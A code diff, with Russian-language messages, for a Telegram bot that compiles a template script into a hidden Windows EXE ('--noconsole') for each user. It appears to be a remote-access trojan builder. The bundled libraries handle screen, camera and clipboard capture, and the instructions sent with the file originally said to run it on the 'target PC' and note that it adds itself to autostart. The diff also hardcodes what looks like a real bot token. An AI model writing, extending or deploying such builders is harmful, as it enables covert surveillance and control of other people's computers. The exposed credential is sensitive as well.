@@ -111,6 +111,23 @@ async def build_bot(message: types.Message):
         )
         return
 
+    # Запускаем сборку в фоне
+    await message.answer(
+        "✅ <b>Токен принят!</b>\n\n"
+        "🚀 <b>Запуск компиляции...</b>\n\n"
+        "⏱️ <b>Время:</b> 2-5 минут\n"
+        "Я пришлю файл когда закончу.",
+        parse_mode="HTML"
+    )
+
+    # Создаём задачу в фоне
+    asyncio.create_task(background_build(message, token, user_id))
+
+
+async def background_build(message: types.Message, token: str, user_id: int):
+    """Фоновая сборка бота."""
+    import glob
+
     status_msg = await message.answer(
         "🛠 <b>Собираю бота...</b>\n\n"
         "📊 <b>Прогресс:</b>\n"
@@ -123,27 +140,23 @@ async def build_bot(message: types.Message):
     if not os.path.exists(work_dir):
         os.makedirs(work_dir)
 
-    # Копируем main.py из текущей папки
     template_path = "main.py"
     if not os.path.exists(template_path):
         await status_msg.edit_text(
             "❌ <b>Ошибка!</b>\n\n"
-            "Файл <code>main.py</code> не найден в папке билдера.\n\n"
-            "Положи файл main.py в ту же папку где запущен builder.py",
+            "Файл <code>main.py</code> не найден.",
             parse_mode="HTML"
         )
         return
-    
-    # Копируем файл
+
     shutil.copy2(template_path, os.path.join(work_dir, "main.py"))
-    
-    # Заменяем токен и MY_ID в скопированном файле
+
     with open(os.path.join(work_dir, "main.py"), "r", encoding="utf-8") as f:
         bot_code = f.read()
-    
+
     bot_code = bot_code.replace('TOKEN = "8736760043:AAFymNRqvbZZiUABNb3-ZwJMneU1ndaJa2U"', f'TOKEN = "{token}"')
     bot_code = bot_code.replace('MY_ID = 1455766271', f'MY_ID = {user_id}')
-    
+
     with open(os.path.join(work_dir, "main.py"), "w", encoding="utf-8") as f:
         f.write(bot_code)
 
@@ -154,9 +167,9 @@ async def build_bot(message: types.Message):
         "📦 <b>Шаг 2/4:</b> Устанавливаю зависимости...",
         parse_mode="HTML"
     )
-    
+
     with open(os.path.join(work_dir, "requirements.txt"), "w", encoding="utf-8") as f:
-        f.write("aiogram>=3.0.0\npyautogui\nopencv-python\npsutil\npyperclip\nsounddevice\nscipy\npycaw; sys_platform == 'win32'\ncomtypes; sys_platform == 'win32'\n")
+        f.write("aiogram>=3.0.0\npyautogui\nopencv-python\npsutil\npyperclip\n")
 
     subprocess.run(
         ["pip", "install", "-r", "requirements.txt", "-q"],
@@ -170,14 +183,17 @@ async def build_bot(message: types.Message):
         "📊 <b>Прогресс:</b>\n"
         "<code>[=======>  ] 50%</code>\n\n"
         "🔨 <b>Шаг 3/4:</b> Компилирую в EXE...\n"
-        "⏱️ Это займёт 30-60 секунд.",
+        "⏱️ 30-60 секунд.",
         parse_mode="HTML"
     )
 
     log_path = os.path.join(work_dir, "pyinstaller.log")
-    with open(log_path, "w", encoding="utf-8") as log_file:
-        try:
-            proc = subprocess.Popen([
+
+    try:
+        # Запускаем в отдельном потоке чтобы не блокировать бота
+        proc = await asyncio.to_thread(
+            subprocess.Popen,
+            [
                 "pyinstaller",
                 "--onefile",
                 "--noconsole",
@@ -187,25 +203,34 @@ async def build_bot(message: types.Message):
                 "--hidden-import=psutil",
                 "--hidden-import=pyperclip",
                 "main.py"
-            ], cwd=work_dir, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
-            
-            stages = [
-                (65, "🔨 Анализирую модули..."),
-                (75, "📦 Собираю библиотеки..."),
-                (85, "🗜️ Упаковываю в EXE..."),
-                (95, "✅ Финализирую..."),
-            ]
-            stage_idx = 0
-            
-            for line in proc.stdout:
+            ],
+            cwd=work_dir,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.STDOUT,
+            text=True
+        )
+
+        stages = [
+            (65, "🔨 Анализирую модули..."),
+            (75, "📦 Собираю библиотеки..."),
+            (85, "🗜️ Упаковываю в EXE..."),
+            (95, "✅ Финализирую..."),
+        ]
+        stage_idx = 0
+
+        for line in proc.stdout:
+            with open(log_path, "a", encoding="utf-8") as log_file:
                 log_file.write(line)
-                log_file.flush()
-                
-                if stage_idx < len(stages):
-                    percent, text = stages[stage_idx]
-                    if any(kw in line.lower() for kw in ["analyzing", "building", "collecting", "copying", "building pkg", "building exe"]):
-                        bars = "=" * (percent // 10)
-                        spaces = " " * (10 - len(bars))
+
+            # Даём боту "вздохнуть" чтобы не было таймаута
+            await asyncio.sleep(0.1)
+
+            if stage_idx < len(stages):
+                percent, text = stages[stage_idx]
+                if any(kw in line.lower() for kw in ["analyzing", "building", "collecting", "copying", "building pkg", "building exe"]):
+                    bars = "=" * (percent // 10)
+                    spaces = " " * (10 - len(bars))
+                    try:
                         await status_msg.edit_text(
                             "🛠 <b>Собираю бота...</b>\n\n"
                             f"📊 <b>Прогресс:</b>\n"
@@ -213,35 +238,34 @@ async def build_bot(message: types.Message):
                             f"{text}",
                             parse_mode="HTML"
                         )
-                        stage_idx += 1
-            
-            proc.wait()
-            
-            if proc.returncode != 0:
-                with open(log_path, "r", encoding="utf-8") as lf:
-                    error_log = lf.read()
-                print(f"PyInstaller ERROR:\n{error_log}")
-                raise Exception(f"PyInstaller вернул код {proc.returncode}")
-                
-        except subprocess.TimeoutExpired:
-            await status_msg.edit_text(
-                "❌ <b>Таймаут сборки!</b>\n\n"
-                "PyInstaller работает слишком долго.",
-                parse_mode="HTML"
-            )
-            return
-        except Exception as e:
-            await status_msg.edit_text(
-                f"❌ <b>Ошибка сборки:</b> {e}",
-                parse_mode="HTML"
-            )
-            return
+                    except:
+                        pass
+                    stage_idx += 1
+
+        # Ждём завершения процесса
+        proc.wait(timeout=300)
+
+        if proc.returncode != 0:
+            raise Exception(f"PyInstaller код: {proc.returncode}")
+
+    except asyncio.TimeoutError:
+        await status_msg.edit_text(
+            "❌ <b>Таймаут!</b>\n\nСборка > 5 минут.",
+            parse_mode="HTML"
+        )
+        return
+    except Exception as e:
+        await status_msg.edit_text(
+            f"❌ <b>Ошибка:</b> {e}",
+            parse_mode="HTML"
+        )
+        return
 
     await status_msg.edit_text(
         "🛠 <b>Собираю бота...</b>\n\n"
         "📊 <b>Прогресс:</b>\n"
         "<code>[==========] 100%</code>\n\n"
-        "✅ <b>Сборка завершена!</b>",
+        "✅ <b>Готово!</b>",
         parse_mode="HTML"
     )
 
@@ -250,10 +274,9 @@ async def build_bot(message: types.Message):
         final_exe_name = f"BotForPC_{user_id}.exe"
         final_exe_path = os.path.join(work_dir, final_exe_name)
         shutil.copy(exe_path, final_exe_path)
-        
+
         exe_size = os.path.getsize(final_exe_path) / (1024 * 1024)
 
-        # Отправляем в Telegram (лимит 50 МБ)
         await status_msg.delete()
         await message.answer_document(
             types.FSInputFile(final_exe_path),
@@ -262,16 +285,15 @@ async def build_bot(message: types.Message):
                 f"📦 <b>Размер:</b> {exe_size:.1f} МБ\n\n"
                 "📋 <b>Инструкция:</b>\n"
                 "1. Сохрани файл\n"
-                "2. Запусти на целевом ПК\n"
+                "2. Запусти на ПК\n"
                 "3. Бот добавится в автозагрузку\n\n"
-                "⚠️ Windows может спросить разрешение — разреши."
+                "⚠️ Windows может спросить разрешение."
             ),
             parse_mode="HTML"
         )
     else:
         await status_msg.edit_text(
-            "❌ <b>Ошибка!</b>\n\n"
-            "Не удалось найти .exe файл.",
+            "❌ <b>Ошибка!</b>\n\nНет .exe файла.",
             parse_mode="HTML"
         )
 
